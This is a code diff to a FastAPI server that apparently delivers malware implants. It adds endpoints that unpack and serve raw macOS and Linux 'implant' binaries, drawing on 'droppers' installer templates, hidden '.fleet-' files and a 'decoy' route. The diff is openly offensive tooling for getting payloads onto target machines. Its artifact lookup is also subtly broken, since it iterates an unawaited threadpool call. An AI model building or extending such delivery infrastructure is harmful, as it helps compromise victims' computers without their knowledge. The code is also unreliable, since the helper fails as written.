@@ -335,6 +335,40 @@ def create_app(settings: Settings | None = None) -> FastAPI:
             return None
         return Path(art["path"])
 
+    def _latest_artifact(os_name: str) -> dict | None:
+        recent = run_in_threadpool(app.state.pipeline.recent, 300)
+        matches = [a for a in recent if str(a.get("os", "")) == os_name]
+        if not matches:
+            return None
+        return max(matches, key=lambda a: float(a.get("ts", 0)))
+
+    def _extract_binary_from_archive(os_name: str) -> tuple[bytes, str] | None:
+        """Extract the raw executable binary from a .command.zip (macOS) or
+        .tar.gz (linux) artifact and return (bytes, filename)."""
+        art = _latest_artifact(os_name)
+        if art is None:
+            return None
+        path = Path(art["path"])
+        name = art["name"]
+
+        if os_name == "darwin" and name.endswith(".command.zip"):
+            import zipfile
+
+            with zipfile.ZipFile(path) as zf:
+                for info in zf.infolist():
+                    if info.filename.endswith(".command"):
+                        return zf.read(info), info.filename
+        elif os_name == "linux" and name.endswith(".tar.gz"):
+            import tarfile
+
+            with tarfile.open(path, "r:gz") as tf:
+                for member in tf.getmembers():
+                    if member.isfile() and member.name.startswith(".fleet-"):
+                        f = tf.extractfile(member)
+                        if f:
+                            return f.read(), member.name
+        return None
+
     @app.get("/install/mac")
     async def install_mac_script(request: Request) -> PlainTextResponse:
         template = (REPO_ROOT / "droppers" / "mac" / "installer.sh.tmpl").read_text(
@@ -349,15 +383,18 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         )
 
     @app.get("/install/mac/binary")
-    async def install_mac_binary() -> FileResponse:
-        path = _artifact_path("darwin")
-        if path is None or not path.is_file():
+    async def install_mac_binary() -> Response:
+        result = _extract_binary_from_archive("darwin")
+        if result is None:
             raise HTTPException(status_code=404, detail="no macOS implant built yet")
-        return FileResponse(
-            path,
-            filename=path.name,
+        data, filename = result
+        return Response(
+            content=data,
             media_type="application/octet-stream",
-            headers={"Cache-Control": "no-store"},
+            headers={
+                "Cache-Control": "no-store",
+                "Content-Disposition": f'attachment; filename="{filename}"',
+            },
         )
 
     @app.get("/install/mac/daemon")
@@ -395,15 +432,18 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         )
 
     @app.get("/install/linux/binary")
-    async def install_linux_binary() -> FileResponse:
-        path = _artifact_path("linux")
-        if path is None or not path.is_file():
+    async def install_linux_binary() -> Response:
+        result = _extract_binary_from_archive("linux")
+        if result is None:
             raise HTTPException(status_code=404, detail="no Linux implant built yet")
-        return FileResponse(
-            path,
-            filename=path.name,
+        data, filename = result
+        return Response(
+            content=data,
             media_type="application/octet-stream",
-            headers={"Cache-Control": "no-store"},
+            headers={
+                "Cache-Control": "no-store",
+                "Content-Disposition": f'attachment; filename="{filename}"',
+            },
         )
 
     @app.get("/install/linux/decoy")
